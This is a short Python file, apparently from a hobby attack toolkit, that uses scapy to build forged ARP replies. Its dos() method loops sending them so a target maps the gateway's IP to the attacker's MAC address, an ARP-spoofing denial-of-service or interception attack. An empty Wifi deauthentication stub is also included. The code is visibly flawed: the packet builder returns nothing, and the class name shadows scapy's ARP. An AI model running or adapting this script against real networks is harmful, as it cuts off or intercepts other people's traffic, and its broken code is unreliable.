from scapy.all import *
from library.lib import get_mac_adress


class ARP :
    def __init__(self,target_ip,target_mac,gateaway_ip) :
        self.target = target_ip
        self.mac = target_mac
        self.gateaway = gateaway_ip
        self.running = False
        self.attacker_MAC = get_mac_adress()
        self.reply = self.create_arp_reply

    def create_arp_reply(self):
        Ether(dst=self.mac)/ARP(op=2,
                                pdst=self.target,
                                hwdst=self.mac,
                                psrc=self.gateaway,
                                hwsrc=self.attacker_MAC)
        
    def dos(self) : 
        self.running = True
        try :
            while self.running :
                sendp(self.reply,iface=conf.iface)
        except KeyboardInterrupt :
            pass

        finally :
            self.running = False


class Wifi : 
    def __init__(self) -> None:
        pass
    def deauthenticate():
        pass